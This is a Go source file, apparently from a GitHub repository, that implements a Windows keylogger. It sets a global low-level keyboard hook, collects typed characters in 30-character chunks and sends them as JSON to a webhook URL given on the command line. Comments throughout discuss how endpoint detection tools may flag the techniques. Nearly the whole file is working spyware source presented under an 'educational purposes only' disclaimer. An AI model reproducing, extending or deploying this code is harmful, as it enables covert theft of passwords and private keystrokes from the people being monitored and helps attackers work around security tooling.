/*
Created from https://github.com/dc401
Find more details at dwchow.medium.com
2024-Aug-17
dchow[AT]xtecsystems.com
"License: Apache 2.0"
DISCLAIMER: Educational purposes only. Use at your own discretion.
*/

package main

import (
	"bytes" //go uses slices to create a buffer because go constructs suck
	"encoding/json"
	"fmt"
	"net/http"
	"os" //careful when using os sometimes its flagged by endpoint solutions
	"strings"
	"syscall"
	"unsafe" //allows you to use pointers when using raw winAPI calls
)

var (
	user32 = syscall.NewLazyDLL("user32.dll") //they call this a secure way for loading dll from syscall package idk why
	/*
		these calls were found to be able to grab global keys vs. input buffers only EDRs may pick this because of the nature
		https://www.elastic.co/security-labs/protecting-your-devices-from-information-theft-keylogger-protection
		You could use getaynckeystate but you would have to use case statements and map everything
		https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
		https://learn.microsoft.com/en-us/windows/win32/inputdev/using-keyboard-input
		https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	*/
	procSetWindowsHookEx = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx   = user32.NewProc("CallNextHookEx")
	procGetMessage       = user32.NewProc("GetMessageW")
	keyboardHook         uintptr
	keyBuffer            []string
	webhookURL           string
)

const (
	/*
		built in hook in GetMessageW constructs using SetWindowsHookExA
		https://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks#wh_keyboard_ll
		https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
		These are the integer parameters for keyboard down and input events to catch in a trap
	*/

	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
)

//Create the parameters it needs usign the C style it wants for WinAPI using user32.dll
//https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

//Use a "callback" function that runs after an initial function is called the esscence of a hook
func keyboardCallback(nCode int, wParam uintptr, lParam uintptr) uintptr { //unlike python the uintptr outside params is the return type. go syntax sucks.
	if nCode >= 0 && wParam == WM_KEYDOWN {
		kb := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam)) //convert number to a generic pointer for the C construct we need from KBDLLHOOKSTRUCT
		r := rune(kb.VkCode)                             // rune is a type in Go same as char in Python apparently to convert
		if printableASCII(r) {
			keyChar := string(r)
			keyBuffer = append(keyBuffer, keyChar)

			totalLength := 0
			for _, char := range keyBuffer {
				totalLength += len(char)
			}

			if totalLength >= 30 { //created a arbitrary 30 character buffer in blocks so its easier to send chunks to a webhook later
				go sendWebhook(strings.Join(keyBuffer, ""))
				keyBuffer = nil
			}
		}
	}
	//windows uses hook chains this article explains it well https://m417z.com/Implementing-Global-Injection-and-Hooking-in-Windows/
	//so pass stuff to the next hook so secret sauce of "global" keystroke monitoring
	ret, _, _ := procCallNextHookEx.Call(keyboardHook, uintptr(nCode), wParam, lParam)
	return ret
}

//Filter for printable only ASCII / UTF-8 characters
//if you want base64 encoded non-printables make this yourself
func printableASCII(r rune) bool {
	return r >= 32 && r <= 126
}

//construct message from the keyBuffer earlier
func sendWebhook(message string) {
	payload := map[string]string{
		"message": message,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error creating JSON payload:", err)
		return
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		fmt.Println("Error sending webhook:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Println("Webhook sent. Status:", resp.Status)
}

func main() {
	//positioning arguments needed to include your webhook url like https://webhook-test.com/
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run goklog.go <webhook_url>")
		os.Exit(1)
	}

	webhookURL = os.Args[1]
	fmt.Printf("Using webhook URL: %s\n", webhookURL)

	fmt.Println("Global keyboard capture started. Press Ctrl+C to exit.")

	/*
		we call the function but you have to return it to multiple values "_" means ignore value so its handled on the left side
		 the zeros are the returned ignored values not used defined here:
		 https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
	*/
	keyboardHook, _, _ = procSetWindowsHookEx.Call(
		WH_KEYBOARD_LL,
		syscall.NewCallback(keyboardCallback),
		0,
		0,
	)
	// same below https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessage
	var msg struct {
		HWND   uintptr
		UINT   uint32
		WPARAM int16
		LPARAM int64
		DWORD  uint32
		POINT  struct{ X, Y int64 }
	}

	//go is interesting you can do an infinite loop by itself without constraints or conditions like a while True in Python
	for {
		procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
	}
}
